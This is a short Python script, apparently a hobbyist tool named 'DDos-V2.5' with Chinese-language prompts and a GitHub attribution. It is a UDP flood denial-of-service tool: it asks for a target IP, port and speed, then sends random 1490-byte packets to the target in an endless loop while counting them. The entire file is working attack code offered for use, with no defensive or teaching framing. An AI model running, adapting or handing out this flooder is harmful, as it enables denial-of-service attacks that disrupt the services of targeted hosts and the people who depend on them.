import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
print("DDOSVby情雲工作室")
text="""
========================================
工程:DDos-V2.5
製作:情雲工作室
由魚生發佈置gifhub
https://github.com/hellonoob25/Qing_Yun-Studio/blob/main/DDOSV2.5
========================================
"""
print("\033[5;31m%s\033[0m"%text)
ip = input("请输入 IP:")
port = int(input("攻击端口:"))
sd = int(input("攻击速度(1~1000):"))

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)
